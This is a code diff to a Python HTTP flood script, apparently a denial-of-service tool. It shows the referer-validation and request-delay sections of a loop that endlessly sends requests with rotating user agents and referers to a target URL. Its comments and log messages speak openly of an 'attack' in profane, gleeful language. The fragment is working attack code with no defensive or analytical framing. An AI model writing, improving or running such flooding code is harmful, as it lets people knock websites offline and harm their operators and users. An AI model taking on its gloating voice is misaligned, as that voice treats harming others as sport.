@@ -157,15 +157,14 @@ referers = [
 
 # Function to check referer validity (disabled for max FUCKERY)
 def is_valid_referer(referer):
-    return True
-    # try:
-    #     response = requests.get(referer, timeout=5)
-    #     return response.status_code < 400
-    # except requests.RequestException:
-    #     return False
+    try:
+        response = requests.get(referer, timeout=5)
+        return response.status_code < 400
+    except requests.RequestException:
+        return False
 
 # Remove invalid referers (disabled because FUCK IT)
-valid_referers = referers # [r for r in referers if is_valid_referer(r)]
+valid_referers = [r for r in referers if is_valid_referer(r)]
 if not valid_referers:
     print(f"{RED}No valid referers found. Attack may be less effective. SHIT!{RESET}")
     log("No valid referers found. Attack may be less effective. SHIT!")
@@ -235,7 +234,7 @@ def attack_thread(url):
     while True:
         user_agent = random.choice(user_agents)
         http_request(url, user_agent)
-        # time.sleep(random.uniform(0.01, 0.1)) # Add some random delay, just to be a dick
+        time.sleep(random.uniform(0.01, 0.1)) # Add some random delay, just to be a dick
 
 # Main function
 def main():
